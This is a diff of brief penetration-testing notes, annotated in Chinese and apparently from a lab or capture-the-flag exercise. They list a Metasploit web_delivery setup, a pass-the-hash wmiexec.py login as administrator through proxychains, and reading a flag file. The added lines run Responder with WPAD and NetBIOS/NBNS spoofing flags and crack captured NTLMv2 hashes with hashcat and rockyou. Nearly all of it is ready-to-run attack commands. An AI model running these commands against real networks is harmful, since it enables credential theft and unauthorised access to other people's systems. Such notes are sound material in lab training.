@@ -1,3 +1,5 @@
+一
+
 msf delivery:
 sudo msfconsole -q
 search web_delivery
@@ -46,3 +48,11 @@ proxychains wmiexec.py administrator@172.16.6.3 -hashes aad3b435b51404eeaad3b435
 C:\>type c:\users\administrator\desktop\flag.txt      读取flag
 
 
+二
+
+sudo responder -I ens224 -wrfv
+      -w	启用 WPAD（Web Proxy Auto-Discovery）欺骗
+      -r	启用 NetBIOS 名称解析欺骗（高级）
+      -f	启用 NBNS 查询欺骗（高级）
+      -v	详细输出模式（显示更多信息）
+hashcat -m 5600 AB920_ntlmv2 /usr/share/wordlists/rockyou.txt.gz
